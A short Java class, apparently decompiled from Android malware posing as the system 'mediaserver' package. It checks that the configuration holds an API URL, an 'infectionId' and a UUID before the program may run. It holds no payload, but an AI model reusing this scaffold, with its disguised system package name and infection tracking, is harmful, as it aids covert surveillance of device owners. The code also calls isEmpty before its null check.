package com.android.mediaserver.prerequisites;

import android.content.Context;
import com.android.mediaserver.config.Config;
import timber.log.Timber;

public class PrerequisitesChecker {
  public static boolean checkCanRun(Context context) {
    Config config = Config.getInstance(context);
    if (!config.getApiUrl().isEmpty()
        && config.getApiUrl() != null
        && config.getInfectionId() != null
        && config.getUuid() != null
        && !config.getUuid().isEmpty()) {
      return true;
    }
    Timber.w("Not allowed to run, config values are invalid", new Object[0]);
    return false;
  }
}
